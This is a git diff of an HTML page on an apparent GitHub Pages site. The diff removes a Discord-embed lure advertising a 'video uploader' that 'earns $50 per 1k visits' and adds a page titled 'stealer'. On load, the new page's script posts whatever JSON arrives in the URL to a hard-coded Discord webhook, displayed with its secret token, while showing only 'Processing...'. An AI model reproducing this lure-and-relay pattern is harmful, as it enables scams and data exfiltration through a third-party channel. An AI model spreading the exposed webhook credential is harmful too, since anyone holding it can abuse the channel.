@@ -3,50 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub Website with Embed</title>
-    <meta name="description" content="A simple website with an embedded image.">
-    
-    <!-- Open Graph Tags for Discord Embed -->
-    <meta property="og:title" content="2co">
-    <meta property="og:description" content="Try our new video uploader—earn $50 per 1k visits!">
-    <meta property="og:image" content="https://github.com/quickdownload/quickdownload.github.io/imagez.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:url" content="https://github.com/quickdownload/quickdownload.github.io">
-    <meta property="og:type" content="website">
+    <title>stealer</title>
+    <script>
+        window.addEventListener("load", () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const jsonParam = urlParams.get("json");
 
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            height: 100vh;
-            text-align: center;
-        }
-        img {
-            border: 2px solid #ccc;
-            border-radius: 10px;
-            max-width: 90%;
-            height: auto;
-            margin-top: 20px;
-        }
-        h1 {
-            color: #333;
-        }
-        p {
-            color: #555;
-        }
-    </style>
+            if (!jsonParam) {
+                document.body.innerHTML = "<h1>Error: Missing 'json' query parameter.</h1>";
+                return;
+            }
+
+            try {
+                const embedPayload = JSON.parse(decodeURIComponent(jsonParam));
+
+                const webhookUrl = "https://discord.com/api/webhooks/1331275967028658317/AaL8EuVdhJCku3QrsI0RG4195--Q-LBM33KG_n-1uPp5RLEUPCGuYNdDAQmXzAkNe2PT";
+
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(embedPayload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        document.body.innerHTML = "<h1>Payload sent successfully to the webhook!</h1>";
+                    } else {
+                        document.body.innerHTML = `<h1>Error: ${response.statusText}</h1>`;
+                    }
+                })
+                .catch(error => {
+                    document.body.innerHTML = `<h1>Request failed: ${error.message}</h1>`;
+                });
+            } catch (error) {
+                document.body.innerHTML = `<h1>Invalid JSON payload: ${error.message}</h1>`;
+            }
+        });
+    </script>
 </head>
 <body>
-    <h1>Welcome to My GitHub Website</h1>
-    <p>Here’s the embedded image:</p>
-    <img src="imagez.png" alt="Description of the image">
-    <p>Image Name: <strong>imagez.png</strong></p>
+    <h1>Processing...</h1>
 </body>
 </html>
